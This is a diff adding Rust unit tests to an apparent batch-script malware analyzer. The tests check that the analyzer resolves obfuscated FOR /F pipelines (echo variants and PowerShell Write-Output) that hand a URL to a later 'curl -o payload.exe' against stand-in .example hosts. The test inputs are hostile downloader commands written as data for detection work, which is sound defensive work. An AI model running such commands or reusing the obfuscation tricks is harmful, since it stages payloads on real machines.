@@ -6206,6 +6206,125 @@ for /f "tokens=* delims=" %%F in ('dir /b/s C:\Work\*.txt') do for /f "tokens=* 
     }
 
     #[test]
+    fn for_f_echo_pipeline_feeds_later_curl() {
+        let report = analyze(
+            br#"for /f "tokens=* delims=" %%U in ('echo https://for-f-echo.example/payload.exe') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-echo.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F echo pipeline did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("echo https://for-f-echo.example")
+            )),
+            "supported echo pipeline should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_usebackq_echo_pipeline_feeds_later_curl() {
+        let report = analyze(
+            br#"for /f "usebackq tokens=* delims=" %%U in (`echo https://for-f-echo-backtick.example/payload.exe`) do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-echo-backtick.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F usebackq echo pipeline did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("echo https://for-f-echo-backtick.example")
+            )),
+            "supported usebackq echo pipeline should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_inline_echo_pipeline_feeds_later_curl() {
+        for (script, expected) in [
+            (
+                br#"for /f "tokens=* delims=" %%U in ('echo:https://for-f-inline-echo.example/payload.exe') do curl -o payload.exe %%U"#.as_slice(),
+                "https://for-f-inline-echo.example/payload.exe",
+            ),
+            (
+                br#"for /f "tokens=* delims=" %%U in ('echo(https://for-f-paren-echo.example/payload.exe') do curl -o payload.exe %%U"#.as_slice(),
+                "https://for-f-paren-echo.example/payload.exe",
+            ),
+        ] {
+            let report = analyze(script, &Config::default());
+            assert!(
+                report.traits.iter().any(|t| {
+                    matches!(
+                        t,
+                        Trait::Download { src, dst: Some(dst), .. }
+                            if src == expected && dst == "payload.exe"
+                    )
+                }),
+                "FOR /F inline echo pipeline did not feed later curl: {:?}\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+    }
+
+    #[test]
+    fn for_f_powershell_write_output_feeds_later_curl() {
+        let report = analyze(
+            br#"for /f "tokens=* delims=" %%U in ('powershell -Command "Write-Output https://for-f-ps-output.example/payload.exe"') do set U=%%U
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-ps-output.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F PowerShell Write-Output did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("Write-Output")
+            )),
+            "supported PowerShell Write-Output pipeline should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn for_f_findstr_m_wildcard_discovers_matching_generated_file_source() {
         let report = analyze(
             br#"echo noise>noise.txt
